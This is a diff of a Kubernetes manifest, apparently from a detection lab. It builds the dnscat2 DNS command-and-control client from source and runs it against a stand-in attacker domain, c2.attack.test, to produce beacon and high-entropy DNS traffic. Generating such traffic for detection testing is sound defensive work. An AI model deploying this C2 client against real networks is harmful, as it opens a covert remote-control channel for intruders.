@@ -1,8 +1,8 @@
 # dnscat2 client — C2 over DNS. Генерирует трафик: C2_BEACON, C2_TXT_REQUEST, HIGH_ENTROPY.
 #
-# Сервер (dnscat2) работает в namespace attack-server (servers/deploy.sh dnscat2).
-# Задать ATTACK_DOMAIN (по умолчанию c2.attack.test) и задеплоить.
-# Первый старт ~1–2 мин (gem install dnscat2). Требует больше памяти на этапе установки gem (компиляция).
+# Официальный клиент — на C (не Ruby), собирается из исходников. Гем dnscat2 в RubyGems нет.
+# Сервер (dnscat2) в namespace attack-server (servers/deploy.sh dnscat2).
+# Первый старт ~1–2 мин (clone + make).
 ---
 apiVersion: apps/v1
 kind: Deployment
@@ -26,24 +26,29 @@ spec:
     spec:
       containers:
         - name: dnscat2
-          image: ruby:3.2-alpine
+          image: alpine:3.19
           command: ["/bin/sh", "-c"]
           args:
             - |
+              set -e
               echo "Waiting for DNS..."
-              sleep 15
+              sleep 10
               for i in 1 2 3 4 5; do
-                apk add --no-cache build-base && break
-                echo "apk failed (attempt $i/5), retrying in 20s..."
-                sleep 20
+                apk add --no-cache build-base git && break
+                echo "apk failed (attempt $i/5), retrying in 15s..."
+                sleep 15
               done
               for i in 1 2 3 4 5; do
-                gem install dnscat2 && break
-                echo "gem install failed (attempt $i/5), retrying in 20s..."
-                sleep 20
+                git clone --depth 1 https://github.com/iagox86/dnscat2.git && break
+                echo "git clone failed (attempt $i/5), retrying in 15s..."
+                sleep 15
+                rm -rf dnscat2
               done
-              command -v dnscat2 >/dev/null 2>&1 || { echo "FATAL: dnscat2 not installed"; sleep 3600; exit 1; }
-              exec dnscat2 "$ATTACK_DOMAIN"
+              cd dnscat2/client && make
+              BIN=./dnscat
+              [ -x ./dnscat ] || BIN=./dnscat2
+              [ -x "$BIN" ] || { echo "FATAL: no dnscat binary"; sleep 3600; exit 1; }
+              exec $BIN "$ATTACK_DOMAIN"
           env:
             - name: ATTACK_DOMAIN
               value: "c2.attack.test"
@@ -52,8 +57,8 @@ spec:
           resources:
             requests:
               cpu: 100m
-              memory: 256Mi
+              memory: 128Mi
             limits:
-              cpu: 1000m
-              memory: 768Mi
+              cpu: 500m
+              memory: 384Mi
       restartPolicy: Always
